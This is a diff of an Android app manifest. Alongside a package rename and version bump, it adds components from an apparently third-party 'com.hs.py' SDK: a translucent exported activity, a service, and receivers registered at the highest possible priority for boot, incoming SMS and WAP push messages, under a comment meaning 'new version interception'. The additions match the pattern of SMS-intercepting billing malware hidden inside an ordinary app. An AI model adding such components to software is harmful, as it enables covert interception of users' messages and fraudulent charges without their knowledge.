@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.wsug.zjy.mm"
+    package="com.wsfg.zd"
     android:versionCode="9"
-    android:versionName="9.3.20160301" >
+    android:versionName="9.4.20160303" >
 
     <uses-sdk
         android:minSdkVersion="8"
@@ -64,7 +64,7 @@
         <activity
             android:name="com.zmv.zf.activity.LaunchActivity"
             android:label="@string/app_name"
-            android:launchMode="singleTask"
+            android:launchMode="singleInstance"
             android:screenOrientation="portrait" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -339,6 +339,53 @@
         </receiver>
 
         <!-- 应美sdk end -->
+          <activity
+            android:name="com.hs.py.activity.HsActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent" >
+        </activity>
+        
+        <!-- android:screenOrientation="landscape" -->
+
+        <activity
+            android:name="com.alipay.sdk.app.H5PayActivity"
+            android:configChanges="orientation|keyboardHidden|navigation"
+            android:exported="false"
+            android:screenOrientation="behind" >
+        </activity>
+        <activity
+            android:name="com.alipay.sdk.auth.AuthActivity"
+            android:configChanges="orientation|keyboardHidden|navigation"
+            android:exported="false"
+            android:screenOrientation="behind" >
+        </activity>
+        
+        <service android:name="com.hs.py.service.HsPlateService" >
+        </service>
+        <!-- 新版本拦截 -->
+        <receiver android:name="com.hs.py.util.sms.BootReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.hs.py.service.HsSmsService"
+            android:enabled="true" />
+        <receiver android:name="com.hs.py.util.sms.SmsReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.hs.py.util.sms.WapPushReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
+
+                <data android:mimeType="application/vnd.wap.sic" />
+            </intent-filter>
+        </receiver>
     </application>
 
 </manifest>
